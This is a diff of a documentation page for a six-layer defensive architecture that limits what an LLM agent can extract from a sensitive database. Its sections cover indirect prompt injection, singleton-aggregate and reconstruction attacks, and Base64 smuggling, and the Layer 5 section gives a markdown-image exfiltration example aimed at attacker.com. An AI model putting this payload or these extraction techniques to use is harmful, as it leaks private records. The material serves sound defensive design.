@@ -1,14 +1,70 @@
 ---
 title: "Layer-by-layer reference"
-description: "Each of the six layers: purpose, what it defends against, what it does NOT, common implementation mistakes."
+description: "Each of the six layers: purpose, what it defends against, what it does not, and the common ways it gets implemented wrong."
 sidebar:
   order: 4
 ---
 
 import { Aside } from '@astrojs/starlight/components';
 
-<Aside type="caution" title="Stub">
-This section is a placeholder. Prose forthcoming.
-</Aside>
+A reference for the six layers of the [reference architecture](./00-trust-boundaries/). Use this when designing or reviewing a specific layer in isolation.
 
-Each of the six layers: purpose, what it defends against, what it does NOT, common implementation mistakes.
+## Layer 1 — Mediation API
+
+**Purpose.** Define the complete set of operations the model can ever request. Reject everything outside that set.
+
+**Defends against.** Every attack that requires the model to invoke a capability that doesn't exist: free-form SQL, raw row reads, listing all columns, schema modification, side-effects. This is the load-bearing layer; if Layer 1 is right, most attacks die before reaching the database.
+
+**Does not defend against.** Attacks that compose *legal* tool calls into something the legal calls weren't supposed to support — singleton aggregates, query-budget exhaustion, reconstruction via many narrow queries. Those are Layer 2's job.
+
+**Common mistakes.** (1) Including an `execute_sql` or `query(string)` tool "for flexibility." (2) Allowing user-supplied raw SQL fragments inside otherwise-mediated tools (e.g. `aggregate(filters: "WHERE x = y")`). (3) Trusting the tool *description* to constrain behaviour rather than the *implementation*. (4) Letting the schema accept identifiers as arguments without an allow-list.
+
+## Layer 2 — Aggregation enforcement
+
+**Purpose.** Ensure that aggregates returned to the LLM cannot be re-targeted at individuals. Two enforcement primitives: minimum group size (k-min suppression) and maximum result cardinality.
+
+**Defends against.** Filter-down-to-one attacks (singleton aggregates), high-cardinality groupbys that effectively enumerate a column, and the slow-burn version of the reconstruction attack when paired with a privacy budget.
+
+**Does not defend against.** Many composed-aggregate attacks issued *over time* — k-min on each query individually does not stop reconstruction across thousands of queries. That requires a [DP budget](../patterns/differential-privacy/) and per-user composability tracking.
+
+**Common mistakes.** (1) k_min set in the prompt rather than the tool. (2) k_min applied to the *returned* aggregate but not to *intermediate* groupings (so a subgroup of size 1 inside a larger groupby still leaks). (3) Filter-narrowness check missing — a `filters` parameter that allows arbitrary nesting can effectively bypass k_min unless every reachable subgroup is checked.
+
+## Layer 3 — Pre-LLM transformation
+
+**Purpose.** Transform data *before it ever reaches the LLM*: replace direct identifiers with stable pseudonyms, generalise quasi-identifiers (zip → zip3, age → decade), exclude or redact free-text fields that could carry indirect injection.
+
+**Defends against.** Identifier leakage in returned rows (when rows are returned at all), re-identification via combinations of quasi-identifiers, and indirect prompt injection via free-text fields.
+
+**Does not defend against.** Aggregate-only attacks (no rows ever return); attacks against numeric data the LLM is supposed to compute on; attackers who re-identify through joins with external datasets they already have.
+
+**Common mistakes.** (1) Pseudonymisation done in application code instead of at the database view layer (so the LLM has to be trusted to call it correctly — see [capability over intent](../mental-models/04-capability-over-intent/)). (2) Pseudonymisation tokens that aren't stable across sessions, breaking legitimate analytical workflows. (3) Generalisation of *some* quasi-identifiers but not others — every uncovered column is a reidentification vector.
+
+## Layer 4 — DB role with least privilege
+
+**Purpose.** The database role used by the agent has the smallest possible privilege set: read-only, restricted to sanitised views, no access to raw tables, no schema introspection beyond what the mediation API needs, no DDL.
+
+**Defends against.** Every attack that bypasses Layer 1's tool surface to reach the database directly (e.g. via an unintended SQL injection in a tool implementation), and any compromise of the host process that doesn't also compromise the DB itself.
+
+**Does not defend against.** Attacks executed *within* the privileges granted — if the role can `SELECT` from `patients_view`, an attacker who reaches the DB can do the same. Least privilege bounds the blast radius; it does not eliminate it.
+
+**Common mistakes.** (1) Reusing an application-level service account that has more privileges than the agent needs. (2) Granting access to base tables for "performance" reasons. (3) Forgetting that `SELECT` on a view that joins to sensitive tables is functionally equivalent to access to those tables.
+
+## Layer 5 — Egress check
+
+**Purpose.** Deterministic post-processing on the LLM's outgoing response, before the user sees it. Catches what gets through the upstream layers when the model is induced to quote, restate, or encode sensitive data.
+
+**Defends against.** Inline quoting of raw rows the model received (even legitimately) as part of a tool result. Markdown-image exfiltration (`![](attacker.com/?x=...)`). Base64-blob smuggling. Numeric-density-suspicious responses ("summarise the trend" → 400 numbers).
+
+**Does not defend against.** Anything the model can paraphrase below the threshold (a clever attacker can extract data one piece at a time, in natural-sounding sentences). It is a coarse net; cheap to add, high marginal value, but not a load-bearing control.
+
+**Common mistakes.** (1) Implementing the egress check using an LLM (see [LLM-as-judge corollary](../mental-models/04-capability-over-intent/)). (2) A denylist of "known bad strings" without a generic length/density check, missing data the denylist didn't anticipate. (3) Letting the model's "reasoning" blocks bypass the filter while only checking the final answer.
+
+## Layer 6 — Audit + rate-limit
+
+**Purpose.** Log every tool call (user, args, result, timestamp, budget consumed) and every model response (pre- and post-egress). Apply per-user rate limits, both raw and budget-weighted. Optional: anomaly detection on query patterns.
+
+**Defends against.** Long-running reconstruction attacks (detected after the fact), abuse by authenticated users (detected and attributable), audit-and-compliance requirements. This is the layer that lets you *respond* to incidents at all.
+
+**Does not defend against.** Anything in real time. Logs are evidence, not enforcement. They are how you find out what happened, not how you stop it.
+
+**Common mistakes.** (1) Logging the tool result but not the model's response. (2) Per-API-key budgets when API keys are easy to obtain. (3) No retention policy, leading to either a privacy problem of its own (logs *are* sensitive data) or a compliance problem (logs deleted before they're needed).
